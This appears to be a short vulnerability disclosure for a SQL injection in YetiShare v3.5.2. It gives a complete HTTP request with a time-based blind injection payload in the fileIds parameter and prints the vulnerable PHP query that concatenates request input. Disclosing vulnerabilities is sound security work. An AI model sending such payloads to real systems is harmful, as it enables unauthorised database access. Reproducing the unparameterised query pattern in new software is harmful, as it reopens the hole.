# CVE-2019-19734
YetiShare SQL Injection in the fileIds parameter in _account_move_file_in_folder.ajax.php - v3.5.2. This can be exploited by a regular user via GET or POST request. Newer versions are not vulnerable to this however due to the fileIds array being casted to int before being used in the query.

# Example request
```
GET /_account_move_file_in_folder.ajax.php?folderId=2&fileIds%5B%5D=700)/**/AND/**/SLEEP(10 HTTP/1.1
Host: 192.168.0.62
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Referer: http://192.168.0.62/account_home.html
Cookie: filehosting=cj0e0cg8hm9ija6fgs6iirrbj7; jstree_open=%23-1%2C%231; jstree_load=; jstree_select=%231
```

# _account_move_file_in_folder.ajax.php, row 37, $fileIds
```
    $fileIds     = $_REQUEST['fileIds'];
    if(COUNT($fileIds))
    {
        $db->query('UPDATE file SET folderId '.($folderId==NULL?'= NULL':'= '.(int)$folderId).' WHERE id IN ('.implode(',',$fileIds).') AND userId = '.$Auth->id);
    }
```
